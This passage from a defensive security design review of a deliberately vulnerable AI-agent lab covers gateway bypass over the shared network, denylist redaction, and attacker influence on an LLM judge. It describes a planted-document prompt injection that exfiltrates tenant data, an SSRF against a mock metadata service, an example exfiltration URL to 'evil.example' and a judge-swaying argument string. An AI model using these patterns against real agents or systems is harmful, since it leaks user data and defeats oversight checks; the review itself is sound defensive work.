`SR-B5-2` and B5 2.1 frame bypass as a *code* decision: a built-in that skips the gateway because it is "internal." The implementation reveals a second, larger bypass that no baseline leaf names. Compose puts `api`, `agent`, `gateway`, `db` and `mock-metadata` on one bridge network. **The agent container can open a socket to the metadata fixture, and to Postgres, regardless of what the gateway decides.** D5's strong form removes the intended path — the hardened agent binary holds no tool code — and it does not remove the network.

**D5 also changes what exploiting the residual costs, and the residual must be stated at its new severity.** With no fetch primitive in the agent binary, reaching the metadata fixture from the agent process requires **code execution in that process, not prompt influence over it.** An attacker who controls only the content the agent reads has no socket to open. The residual stays declared — the network layer is genuinely unenforced and process compromise is a real escalation path — but it drops from *influence-level* to *compromise-level*, and the writeup claims exactly that and no more.

The honest statement is that M2's mediation is enforced by code structure and is unenforced at the network layer, and Compose cannot express the egress policy that would close it (that is a `NetworkPolicy`, and there is no Kubernetes here). **Generalisable: "every call is mediated" is a claim about a process boundary, and a process boundary is only as strong as the network boundary underneath it.** Recorded as R-M2-3, and it is the honest limit on what the M2 writeup may claim.

### M2-N2 — Redaction by pattern is a denylist, and this repo already ruled against denylists

`SR-B7-5` requires secrets redacted at audit write time, with a regression test asserting no token pattern survives. `SR-B7-1`, one requirement earlier in the same boundary, requires that link-local and private ranges be denied **"by range, never by string match."**

These are the same argument reaching opposite conclusions. A regex over a free-form payload is exactly the string-match approach B7 forbids for addresses: it enumerates what is known to be bad, and the attacker writes the payload. A token split across two JSON fields, base64'd, or simply in a format the pattern did not anticipate, survives into the audit store — and the green regression test is then **camouflage**, in the same sense B9's digest-pinning finding uses the word.

There is no free structural alternative, because an audit record of a free-form tool call is free-form by construction. The defensible position is to redact **by schema** where the shape is known (declared credential fields, `Authorization` headers) and to **declare the free-form remainder as residual** rather than let a passing pattern test imply coverage it does not have. Recorded as R-M2-2. The regression test ships as specified, with its limits written into `defenses/`.

### M2-N3 — `SR-B5-1` needs a distinction it does not make: the subject of a decision vs. testimony about it

`SR-B5-1` says no attacker-influenceable value is an input — "not the tool's self-description, not the model's justification, not a prior result." But the judge **must** read the tool call's arguments, and those arguments are model output derived from untrusted content. Read literally, the requirement forbids the gate from examining the thing it exists to examine.

The missing distinction:

- **The subject of the decision** — the fully-resolved arguments. Attacker-influenced, and must be inspected. `SR-B5-3` already says so.
- **Testimony about the subject** — the tool's self-description, the model's stated justification, a prior result. Attacker-influenced, and must never be consulted, because each is an *assertion by the party being judged*.

A gate that inspects `url=http://evil.example/?d=<doc>` is compliant. A gate that is told *"the user asked me to back up this document"* and weighs it is not. **The line is not whether an input is attacker-influenced — nearly everything is. It is whether the input is evidence the attacker chose to supply about their own request.**

The line belongs in `v1` of the baseline as a narrowing of SR-B5-1 — the fourth time a diff has corrected its own upstream document.

It also has an implementation consequence, though not in this module: jev-lab's judge is prompted with a question set, and **any question of the form "why does the agent want this?" is the forbidden shape.** That audit moves to M4a with the judge itself (D2), and M2-N5 carries the harder version of the same question — whether a judge's verdict is admissible evidence at all.

Worth noting that drawing this line is what exposed D2. Once "the gate may inspect the subject but not testimony about it" is stated precisely, the next question is what M2's gate actually needs to inspect — and the answer turned out to be two deterministic lookups.

### M2-N4 — `HARDENED` is now read by two processes in two languages, with nothing making them agree

M1 read the flag once, in `loadJWTSecret`'s neighbourhood, as `os.Getenv("HARDENED") == "true"` — already typo-tolerant with no log line distinguishing "unset" from "ture". M2 adds a second reader in Python, with its own parsing, its own default, and **no mechanism ensuring the two processes agree.**

A split-brain stack — hardened API, vulnerable gateway — is a runtime state M1 could not produce and that nothing in M2 detects. It is also precisely the state an attacker would choose. The cheap control is for the gateway to report its mode on a health endpoint and for the API to refuse to start on a mismatch, which converts a silent disagreement into a startup failure, consistent with `controls-that-fire-before-a-request-exists.md`. Carried into T6.

---

### M2-N5 — A judge in the decision path is itself attacker-influenceable, and `SR-B5-1` does not say whether its verdict is platform-owned state

Recorded here although M2 declines to make it reachable (D2), because the derivation found it and M4a inherits it. Same shape as M1-N5, which recorded the surviving `org_id` claim and handed it to M3.

`SR-B5-1` permits the gate to consult "the session capability set, the fully-resolved target, and policy." M2-N3 added the distinction the baseline was missing: arguments are the **subject** of the decision and must be inspected; descriptions, justifications and prior results are **testimony** and must not be.

An LLM judge sits in neither category cleanly. Its verdict is a *derived* value the policy then trusts, and the thing it was derived from is attacker-influenced. A caller who knows a judge is present writes into the argument itself — `?note=routine_backup_approved_by_admin` — and is no longer attacking the tool, but the component that decides whether the tool runs. That is B5 1.1 and 1.2 reached through a control rather than around it.

The open question, which M4a must answer before it ships a judge: **does a probabilistic opinion derived from the subject count as platform-owned state?** Three positions are available, and the choice is a design decision rather than a detail — the judge's output is advisory and can only narrow, never widen, an already-deterministic decision; or the judge's questions are constrained to properties of the *resolved target* rather than of free text; or the judge is accepted as an attacker-influenceable input with a named residual and a detection rule aimed at it. M2 takes none of them, because M2 has no judge.

---

## 5. Verdict on baseline assumptions that have now met an implementation

| Assumption | Verdict |
|---|---|
| **A8.2** — an agent session acts within the authority of the user it was created for | **Not yet testable, and deliberately so.** M2 builds the session — the principal the assumption is about — and ships none of its enforcement (D7). A8.2 describes the M3 product. Recording it as "violated" would be misleading: nothing was weakened, the mechanism simply does not exist yet. |
| **A8.4** — a tool does what its description says it does | **Neither upheld nor violated — made irrelevant by construction.** `SR-B5-1` forbids the description from informing the decision, so the assumption's truth value stops mattering. This is B5's thesis arriving early and it disposes of B6's unclosable residual in advance: **mediation makes trustworthiness irrelevant.** The stronger outcome, and the one worth the writeup. |
| **A8.6 as narrowed at M0** — content the agent reads is data *to the platform*: it carries no authority, and no privileged action is taken because the content asked for it | **Upheld in hardened mode, and M2 is the first module where the narrowing is testable at all.** M0 moved enforcement out of the model's compliance and into "the surrounding machinery"; that machinery did not exist until now. The narrowing holds because of `SR-B4-3` (platform-side consequences), **not** because of `SR-B4-2` (wrapping) — if the wrapper were the control, D1's scripted model would defeat it by definition. Violated in vulnerable mode. |
| **A8.10 as added at M0** — the application's runtime identity and internal network position are reachable only by the application itself | **Violated in vulnerable mode; upheld in hardened mode only at the application layer.** M2-N1 is the qualifier: the egress allowlist stops `http_fetch`, and the container's network position is unchanged. The assumption as written is about *reachability*, which is a network property, and M2 enforces it in code. Honest verdict: partially upheld, with the gap named rather than discovered later. |

---

## 6. Residuals accepted for M2

| ID | Residual | Compensating position |
|---|---|---|
| R-M2-1 | With `ScriptedModel`, detect/miss is a fixed fact, not a rate. The detection matrix measures one scripted attack, not a distribution of model behaviours. | The real-model run at n ≥ 20, logged, outside CI (D1). The matrix states which number came from which. |
| R-M2-2 | Audit redaction is pattern-based for free-form payloads (M2-N2). | Schema-based redaction where the shape is known; the free-form remainder declared, so a green test does not imply coverage. |
| R-M2-3 | Mediation is enforced in code, not at the network layer (M2-N1). | Declared. Compose cannot express egress policy; naming the limit is the control available here. |
| R-M2-4 | SR-B3-1…-8 violated by design (D7); SR-B3-9 ships via D4's audit records. | Locked decision #2: naive first, then redesign. M3 owns the enforcement, with findings 05 and 06 as the exercise — and inherits `acting_for` data, so the before/after is measurable rather than asserted. No quiet partial fixes: anything cheap that ships (e.g. `expires_at` for hygiene) is labelled as hygiene, never as the SR. |
| R-M2-5 | Legitimate-capability aggregation (B5 5.1, 5.3) is not closed. | The baseline already calls this unclosable in the general case; `SR-B5-4` raises the cost and `SR-B5-9` detects. Inherited, not newly accepted. |

---

## 7. Exploit assignment

| Finding | Leaf | Evidence it must print |
|---|---|---|
| `attacks/03-indirect-injection` | B4 1.1 → 2.1 → 5.1 | The planted document's instruction text, then the outbound request the agent made carrying that document's contents. The reader must see **the tenant's bytes in the URL** — that is what makes it exfiltration rather than a prompt curiosity. |
| `attacks/04-ssrf-metadata` | B7 1.1, via B5 3.2 / 4.3 | The service-account credential body returned by `mock-metadata`. The redirect variant (B7 1.2) prints the 302 target as well, because it is what distinguishes this from a string-match demo. |

Two-mode assertion per `attacks/README.md`. Exit codes keep M1's semantics: 0 = vulnerable, 1 = control holds, 2 = operational error, so an outage can never read as "control held." **Build 04 first** (D2) — it is deterministic end to end.

**The hardened assertion is a denial reason, never an absence.** D1a guarantees the script attempts the identical call in both modes, so the hardened run can only pass because the gate refused — but `expected.json` has to *assert* that, or a future change that makes the model decline would pass silently:

      "hardened": { "exit_code": 1,
                    "stdout_contains": "gateway denied: egress_not_allowlisted" }   // 03
      "hardened": { "exit_code": 1,
                    "stdout_contains": "gateway denied: resolved_address_denied" }  // 04

An assertion of `exit_code: 1` alone, or of "no data reached the collector," would be satisfied by a model that simply did nothing. **Absence is not evidence of a control** — the same lesson M1 T8 measured, where a silently-blocking control produced no signal and the detector was blind by design.

**Each finding also ships its negative control**, which D1a's causation property makes a one-liner: the same session against a document with *no* imperative must produce `summarise` and zero tool calls, in both modes. Without it, 03 shows that the agent fetched a URL — not that the document caused it.

---

## 8. Open follow-ups from this diff

- **`SR-B5-1` needs narrowing in `v1`** per M2-N3 (subject vs. testimony). Do not edit the baseline; it is a dated artifact.
- **M4a inherits the judge, and two questions with it** (D2, M2-N5): whether a verdict derived from the subject counts as platform-owned state under `SR-B5-1`, and an audit of jev-lab's question set against M2-N3's subject/testimony line — any question shaped *"why does the agent want this?"* is the forbidden form.
- **The implementation plan's M2 line needs amending** to match D2: it specifies `allowlist → judge → OPA` for this module. The vault plan is the planning artifact and is edited; this diff is the record of why.
- **Mode-agreement check between API and gateway** (M2-N4), landing in T6 — extended by D5b to cover service-secret presence, so an unset `TOOLS_SECRET` in either service is a startup failure, not a runtime 401.
- **Carried from M1's T9 audit, now multiplied across a second service:** `SR-B1-1`'s table governs routes *in* the table, not routes that bypass it, and the gateway has no equivalent mechanism at all; `HARDENED`'s typo-tolerance; `store.Open`'s raw exported pool, now with `sessions`, `messages` and `tool_calls` as new org-scoped tables that `ForOrg` does not cover despite being named for an org.
- **M4a inherits the record-as-capability shape that M2 rejected** (D5): external MCP tools cannot live inside the gateway, so mediating a tool you do not own needs a presented decision ID verified against a license store mounted read-only to everyone but the issuer. M2 rejected the mechanism for first-party tools — three processes, an ID-replay hole needing consumed-marking, a third `HARDENED` reader — and M4a inherits both the shape and those three problems as its opening design questions.
- **Repo layout amendment:** a new top-level `experiments/` (D1c) and a new `collector` compose fixture (D6). Both get a row in the README layout table in the same commit that creates them. The M0 layout is a dated artifact; this is the amendment recorded, not a silent row.
- **Queued for the `v1` spec revision** (not raised singly — a spec amended continuously is a spec nobody re-reads): A8.2's scope note that it describes the M3 product, and A8.10's application-layer-vs-network-layer split, which is the same two-claims-in-one-sentence defect M1 found in A8.3.
